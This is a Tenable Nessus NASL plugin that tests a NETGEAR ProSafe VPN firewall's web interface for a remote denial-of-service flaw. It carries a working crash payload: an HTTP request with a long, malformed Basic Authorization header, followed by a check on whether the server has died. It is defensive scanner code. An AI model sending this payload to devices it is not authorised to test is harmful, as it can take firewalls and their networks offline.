#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(11474);
  script_version ("$Revision: 1.9 $");
  script_bugtraq_id(7166);
  script_xref(name:"OSVDB", value:"55304");

  script_name(english:"NETGEAR ProSafe VPN Firewall Web Server Malformed Basic Authorization Header Remote DoS");
  script_summary(english:"Attempts to crash the firewall via a long Basic Authorization string.");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is subject to an buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"It was possible to crash the remote Web server (possibly the NETGEAR
ProSafe VPN Web interface) by supplying a long malformed username and
password. 

An attacker may use this flaw to disable the remote service."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Reconfigure the device to disable remote management, contact the vendor for a patch."
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/www",80);
  exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

soc = http_open_socket(port);
if(soc)
  {
   if (http_is_dead(port: port))exit(0);
   req = http_get(item:"/", port:port);
   req = req - string("\r\n\r\n");

   req = req + string("\nAuthorization: Basic Authorization: Basic NzA5NzA5NzIzMDk4NDcyMDkzODQ3MjgzOXVqc2tzb2RwY2tmMHdlOW9renhjazkwenhjcHp4Yzo3MDk3MDk3MjMwOTg0NzIwOTM4NDcyODM5dWpza3NvZHBja2Ywd2U5b2t6eGNrOTB6eGNwenhj\r\n\r\n");

   send(socket:soc, data:req);
   r = http_recv(socket:soc);
   http_close_socket(soc);
   if (http_is_dead(port: port, retry: 3)) security_warning(port);
}

